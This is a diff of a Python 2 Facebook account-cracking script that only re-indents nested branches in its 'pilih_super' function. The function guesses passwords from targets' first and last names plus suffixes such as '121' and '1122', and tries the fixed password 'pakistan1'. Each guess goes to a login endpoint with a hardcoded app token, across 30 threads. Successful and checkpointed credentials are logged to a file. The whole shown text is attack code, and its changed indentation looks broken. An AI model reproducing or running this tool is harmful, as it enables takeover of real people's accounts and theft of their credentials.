@@ -392,19 +392,19 @@ def pilih_super():
 													cek.close()
 													cekpoint.append(user+pass5)
 												else:
-												pass6 = b['first_name']+'121'
-												data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-												q = json.load(data)
-												if 'access_token' in q:
-													print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6
-													oks.append(user+pass6)
-												else:
-													if 'www.facebook.com' in q["error_msg"]:
-														print '\x1b[1;96m[\x1b[1;93mCekpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6
-														cek = open("out/super_cp.txt", "a")
-														cek.write(user+"|"+pass6+"\n")
-														cek.close()
-														cekpoint.append(user+pass6)
+													pass6 = b['first_name']+'121'
+													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+													q = json.load(data)
+													if 'access_token' in q:
+														print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6
+														oks.append(user+pass6)
+													else:
+														if 'www.facebook.com' in q["error_msg"]:
+															print '\x1b[1;96m[\x1b[1;93mCekpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6
+															cek = open("out/super_cp.txt", "a")
+															cek.write(user+"|"+pass6+"\n")
+															cek.close()
+															cekpoint.append(user+pass6)
 													else:
 														pass7 = b['last_name']+'121'
 														data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
@@ -419,54 +419,52 @@ def pilih_super():
 																cek.write(user+"|"+pass7+"\n")
 																cek.close()
 																cekpoint.append(user+pass7)
-												else:
-												pass8 = b['first_name']+'1122'
-												data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-												q = json.load(data)
-												if 'access_token' in q:
-													print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass8
-													oks.append(user+pass8)
-												else:
-													if 'www.facebook.com' in q["error_msg"]:
-														print '\x1b[1;96m[\x1b[1;93mCekpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass8
-														cek = open("out/super_cp.txt", "a")
-														cek.write(user+"|"+pass8+"\n")
-														cek.close()
-														cekpoint.append(user+pass8)
-													else:
-														pass9 = b['last_name']+'1122'
-														data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-														q = json.load(data)
-														if 'access_token' in q:
-															print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass9
-															oks.append(user+pass9)
 														else:
-															if 'www.facebook.com' in q["error_msg"]:
-																print '\x1b[1;96m[\x1b[1;93mCekpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass9
-																cek = open("out/super_cp.txt", "a")
-																cek.write(user+"|"+pass9+"\n")
-																cek.close()
-																cekpoint.append(user+pass9)
-															else:
-														a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-															b = json.loads(a.text)
-															pass10 = 'pakistan1'
-															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass10)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+															pass8 = b['first_name']+'1122'
+															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
 															if 'access_token' in q:
-																print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass10
-																oks.append(user+pass10)
+																print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass8
+																oks.append(user+pass8)
 															else:
 																if 'www.facebook.com' in q["error_msg"]:
-																	print '\x1b[1;96m[\x1b[1;93mCekpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass10
+																	print '\x1b[1;96m[\x1b[1;93mCekpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass8
 																	cek = open("out/super_cp.txt", "a")
-																	cek.write(user+"|"+pass10+"\n")
+																	cek.write(user+"|"+pass8+"\n")
 																	cek.close()
-																	cekpoint.append(user+pass10)
-																	
-															
-		except:
-			pass
+																	cekpoint.append(user+pass8)
+															else:
+																pass9 = b['last_name']+'1122'
+																data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+																q = json.load(data)
+																if 'access_token' in q:
+																	print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass9
+																	oks.append(user+pass9)
+																else:
+																	if 'www.facebook.com' in q["error_msg"]:
+																		print '\x1b[1;96m[\x1b[1;93mCekpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass9
+																		cek = open("out/super_cp.txt", "a")
+																		cek.write(user+"|"+pass9+"\n")
+																		cek.close()
+																		cekpoint.append(user+pass9)
+																else:
+																	a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
+																	b = json.loads(a.text)
+																	pass10 = 'pakistan1'
+																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass10)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+																	q = json.load(data)
+																	if 'access_token' in q:
+																		print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass10
+																		oks.append(user+pass10)
+																	else:
+																		if 'www.facebook.com' in q["error_msg"]:
+																			print '\x1b[1;96m[\x1b[1;93mCekpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass10
+																			cek = open("out/super_cp.txt", "a")
+																			cek.write(user+"|"+pass10+"\n")
+																			cek.close()
+																			cekpoint.append(user+pass10)												
+																		except:
+																		pass
 		
 	p = ThreadPool(30)
 	p.map(main, id)
